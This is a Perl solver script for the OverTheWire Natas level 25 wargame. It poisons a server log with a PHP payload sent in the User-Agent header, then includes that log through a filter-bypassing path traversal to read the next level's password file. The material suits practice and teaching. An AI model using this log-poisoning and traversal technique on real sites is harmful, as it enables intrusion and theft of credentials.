#!/bin/perl
use LWP::Simple;
use HTML::Parse;
use HTTP::Request;
use HTTP::Response;
use HTTP::Cookies;
use URI;
use v5.16.3;

my $user = 'natas25';
my $login = shift or die "Please provide the password as argument\n";
my $host = $user.'.natas.labs.overthewire.org';
my $uri = URI->new(sprintf("http://%s:%s@%s", $user, $login, $host));

my $ua = LWP::UserAgent->new;
my $cookie_jar = HTTP::Cookies->new();
# Hacking magic
my $sessionId = "hackinmagic";
$cookie_jar->set_cookie( 0, "PHPSESSID", $sessionId, "/", $host, 80, 1, 0, 500, 1);
$uri->query_form("lang" => "....//....//....//....//....//tmp/natas25_".$sessionId.".log");
$ua->agent("<?php echo file_get_contents('/etc/natas_webpass/natas26') ?>");


$ua->cookie_jar( $cookie_jar );
my $request = new HTTP::Request('GET' => $uri);
my $response = $ua->request($request);
$_ = $response->content;
if (/\]\s(.{32})/) {
  say "The password for natas26 is ".$1;
}
